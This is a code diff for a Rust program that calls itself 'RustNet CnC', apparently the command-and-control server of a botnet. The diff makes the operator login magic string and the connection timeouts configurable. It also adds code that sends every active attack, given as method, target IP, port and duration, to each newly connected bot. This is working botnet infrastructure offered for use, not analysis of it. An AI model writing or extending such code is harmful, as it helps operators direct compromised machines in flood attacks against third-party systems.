@@ -81,6 +81,9 @@ pub async fn handle_user_connection(conn: TcpStream, addr: String, state: Arc<Ap
     let title = set_title("☾☼☽ RustNet CnC");
     let resize_sequence = "\x1b[8;32;120t";
     
+    let handshake_timeout = Duration::from_secs(state.config.read().await.handshake_timeout_secs);
+    let magic_string = state.config.read().await.login_magic_string.clone();
+
     // Handle TLS wrapping
     if let Some(ref acceptor) = state.tls_acceptor {
         match accept_tls_connection(acceptor, conn).await {
@@ -90,12 +93,12 @@ pub async fn handle_user_connection(conn: TcpStream, addr: String, state: Arc<Ap
                 tls_stream.write_all(resize_sequence.as_bytes()).await?;
                 
                 // Use bounded read for the first line with timeout
-                let first_line = match tokio::time::timeout(Duration::from_secs(10), read_line_bounded(&mut tls_stream, 1024)).await {
+                let first_line = match tokio::time::timeout(handshake_timeout, read_line_bounded(&mut tls_stream, 1024)).await {
                     Ok(Ok(line)) => line,
                     _ => return Ok(()),
                 };
                 
-                if first_line.trim().starts_with("loginforme") {
+                if first_line.trim().starts_with(&magic_string) {
                     return handle_tls_auth(tls_stream, &addr, state, registry).await;
                 }
             }
@@ -119,12 +122,12 @@ pub async fn handle_user_connection(conn: TcpStream, addr: String, state: Arc<Ap
         conn.write_all(resize_sequence.as_bytes()).await?;
         
         // Use bounded read for the first line with timeout
-        let first_line = match tokio::time::timeout(Duration::from_secs(10), read_line_bounded(&mut conn, 1024)).await {
+        let first_line = match tokio::time::timeout(handshake_timeout, read_line_bounded(&mut conn, 1024)).await {
             Ok(Ok(line)) => line,
             _ => return Ok(()),
         };
     
-        if first_line.trim().starts_with("loginforme") {
+        if first_line.trim().starts_with(&magic_string) {
             // Attempt authentication (non-TLS)
             match auth_user_interactive(&mut conn, &addr, &state).await {
                 Ok(user) => {
@@ -345,9 +348,11 @@ pub async fn handle_bot_connection(conn: TcpStream, addr: std::net::SocketAddr, 
         Box::new(conn)
     };
     
+    let bot_auth_timeout = Duration::from_secs(state.config.read().await.bot_auth_timeout_secs);
+
     // Bot authentication: expect "AUTH <token>" as first message
     let mut auth_buf = vec![0u8; 1024];
-    let n = match tokio::time::timeout(Duration::from_secs(5), conn.read(&mut auth_buf)).await {
+    let n = match tokio::time::timeout(bot_auth_timeout, conn.read(&mut auth_buf)).await {
         Ok(Ok(n)) => n,
         _ => {
             warn!("Bot auth timeout from {}", addr);
@@ -421,6 +426,22 @@ pub async fn handle_bot_connection(conn: TcpStream, addr: std::net::SocketAddr, 
     };
     
     info!("Bot {} connected from {}", bot_id, addr);
+
+    // Send any active attacks to the newly connected bot
+    let active_attacks = state.bot_manager.get_active_attacks().await;
+    if !active_attacks.is_empty() {
+        info!("Sending {} active attacks to new bot {}", active_attacks.len(), bot_id);
+        for (id, method, ip, port, duration) in active_attacks {
+            let command = format!("ATTACK {} {} {} {} {}\n", id, method, ip, port, duration);
+            // We can use the channel we just created, but we need to clone the sender or use the one in bot_arc
+            // Since we have cmd_tx (which is a clone? No, we passed it to Bot::new)
+            // Wait, Bot::new takes ownership of cmd_tx.
+            // We can use _bot_arc.cmd_tx
+            if let Err(e) = _bot_arc.cmd_tx.send(command).await {
+                warn!("Failed to send active attack to new bot {}: {}", bot_id, e);
+            }
+        }
+    }
     
     // Split connection for concurrent read/write
     let (reader, mut writer) = tokio::io::split(conn);
